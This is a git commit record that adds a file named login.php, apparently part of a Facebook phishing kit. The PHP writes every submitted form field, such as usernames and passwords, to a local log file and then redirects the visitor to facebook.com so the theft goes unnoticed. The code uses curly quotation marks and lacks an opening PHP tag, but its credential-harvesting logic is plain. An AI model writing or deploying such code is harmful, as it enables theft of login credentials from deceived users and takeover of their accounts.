b96c28afd79fc971600861afa721d83f493d6444
liohu870 <liohu870@gmail.com>
2024-10-09 17:18:14 +0200

    Add files via upload

---
+++ login.php
@@ -0,0 +1,23 @@
+header (‘Location: http://facebook.com ‘);
+
+$handle = fopen(“logs_86354.txt”, “a”);
+
+foreach($_POST as $variable => $value) {
+
+fwrite($handle, $variable);
+
+fwrite($handle, “=”);
+
+fwrite($handle, $value);
+
+fwrite($handle, “\r\n”);
+
+}
+
+fwrite($handle, “===============\r\n”);
+
+fclose($handle);
+
+exit;
+
+?>
